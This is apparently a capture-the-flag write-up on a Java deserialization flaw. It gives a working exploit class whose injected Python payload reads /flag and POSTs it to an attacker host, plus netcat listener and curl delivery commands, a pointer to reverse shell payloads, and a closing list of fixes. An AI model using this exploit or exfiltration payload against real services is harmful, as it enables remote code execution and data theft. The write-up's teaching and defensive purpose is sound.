# Deserialization 101

## Vulnerability
The service deserialises User Input

## Exploitation
Reusing the code template available in the slides, we can write the following exploit, replacing <HOST:PORT> by a server listening at the given port (e.g. open a https tunnel `ngrok http <LOCAL_PORT>` and then listen `nc -lvnp <LOCAL_PORT>`).  
The Python payload could be replaced by a Reverse Shell payload to get a shell on the server. Some examples can be found on [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python).

```java
package deserialization101;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.Base64;
import java.util.concurrent.ConcurrentSkipListSet;

public class Exploit {

    public static void main(String[] args) throws Exception {
        System.out.println(createMaliciousObject());
    }

    public static String createMaliciousObject() throws Exception {
        CustomComparator customComparator = new CustomComparator(");import http.client;conn = http.client.HTTPSConnection(\"<HOST:PORT>\");conn.request(\"POST\",\"/\", '{}'.format(open('/flag').read().strip()), {'Content-Type': 'application/json'});#");
        var giveMeAnRCE = new ConcurrentSkipListSet<>(customComparator);
        giveMeAnRCE.add(1);
        giveMeAnRCE.add(2);

        var baos = new ByteArrayOutputStream();
        var oos = new ObjectOutputStream(baos);

        oos.writeObject(giveMeAnRCE);
        var bytes = baos.toByteArray();

        oos.close();
        baos.close();

        return Base64.getEncoder().encodeToString(bytes);
    }
}
```

The constructor of `CustomComparator` only allows Strings containing a single character.  
When deserializing, the object was already "constructed", the JVM will use the method `readObject` instead of going through the constructor. So to build our payload, we can update the constructor to allow more than just a single character.

We can then open our listener on our server: `nc -lvnp <PORT>` and request the service with our malicious payload:
```bash
curl --request POST \
  --url http://localhost:80/game1 \
  --header 'Content-Type: text/plain' \
  --data '<Payload>'
```

## Fix
Multiple fix could avoid this problem:
* We should expect an Integer instead of a serialized Integer.
* We could create our own ObjectInputStream to limit the kind of classes that can be deserialized, overriding the method resolveClass.
* We could have overriden the method `readObject` in `CustomComparator` to check the operator has only a single character (same condition as in the constructor).

For more details, you can read this [blog](https://www.redhat.com/en/blog/jdk-approach-address-deserialization-vulnerability) article from Red Hat.
